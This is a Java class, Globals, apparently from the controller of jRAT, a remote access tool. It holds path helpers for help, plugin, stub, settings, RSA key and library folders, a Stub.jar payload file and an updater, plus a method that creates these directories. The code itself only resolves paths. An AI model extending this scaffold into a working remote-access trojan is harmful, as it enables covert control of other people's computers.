package jrat.controller;

import java.io.File;

public class Globals {

	/**
	 * @return global file directory
	 */
	public static File getFileDirectory() {
		return new File("files/");
	}

	/**
	 * @return help documents directory in {@link #getFileDirectory()}
	 */
	public static File getHelpDocDirectory() {
		return new File(getFileDirectory(), "help/");
	}

	/**
	 * @return plugin directory in {@link #getFileDirectory()}
	 */
	public static File getPluginDirectory() {
		return new File(getFileDirectory(), "plugins/");
	}

	/**
	 * @return plugin stubs directory in {@link #getFileDirectory()}
	 */
	public static File getPluginStubDirectory() {
		return new File(getPluginDirectory(), "stubs/");
	}
	
	/**
	 * @return notes directory in {@link #getFileDirectory()}
	 */
	public static File getNotesDirectory() {
		return new File(getFileDirectory(), "notes/");
	}
	
	/**
	 * @return settings directory in {@link #getFileDirectory()}
	 */
	public static File getSettingsDirectory() {
		return new File(getFileDirectory(), "settings/");
	}
	
	/**
	 * @return keypair directory in {@link #getFileDirectory()}
	 */
	public static File getRSAKeysDirectory() {
		return new File(getFileDirectory(), "rsakeys/");
	}
	
	/**
	 * @return library directory in {@link #getFileDirectory()}
	 */
	public static File getLibDirectory() {
		return new File(getFileDirectory(), "lib/");
	}
	
	/**
	 * @return stub file in {@link #getFileDirectory()}
	 */
	public static File getStub() {
		return new File(getFileDirectory(), "Stub.jar");
	}
	
	/**
	 * @return default keyfile jrat.key in {@link #getFileDirectory()}
	 */
	public static File getKeyFile() {
		return getKeyFile("");
	}
	
	/**
	 * @param s string between jrat and .key
	 * @return key file in {@link #getFileDirectory()}
	 */
	public static File getKeyFile(String s) {
		return new File("license" + s + ".json");
	}
	
	/**
	 * @return Updater file in {@link #getFileDirectory()}
	 */
	public static File getUpdater() {
		return new File(getFileDirectory(), "Updater.jar");
	}

	/**
	 * @return Lockfile in .
     */
	public static File getLockFile() {
		return new File(".lock");
	}

	/**
	 * Create all directories
	 */
	public static void mkdirs() {
		getFileDirectory().mkdirs();
		getHelpDocDirectory().mkdirs();

		getPluginDirectory().mkdirs();
		getPluginStubDirectory().mkdirs();
		getNotesDirectory().mkdirs();
		getSettingsDirectory().mkdirs();
		getRSAKeysDirectory().mkdirs();
		getLibDirectory().mkdirs();
	}
}
